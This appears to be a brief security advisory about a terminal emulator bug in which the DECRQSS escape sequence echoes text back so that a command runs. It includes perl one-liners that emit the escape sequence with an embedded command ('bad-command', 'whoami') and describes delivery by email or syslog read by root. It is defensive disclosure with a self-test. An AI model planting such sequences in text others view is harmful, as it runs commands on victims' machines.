DECRQSS Device Control Request Status String "DCS $ q" simply echoes
(responds with) invalid commands. For example,
perl -e 'print "\eP\$q\nbad-command\n\e\\"'
would run bad-command.

Exploitability is the same as for the "window title reporting" issue
in DSA-380: include the DCS string in an email message to the victim,
or arrange to have it in syslog to be viewed by root.

Test:

perl -e 'print "\eP\$q\nwhoami\n\e\\"' > bla.log
cat bla.log

If whoami gets executed you should update.
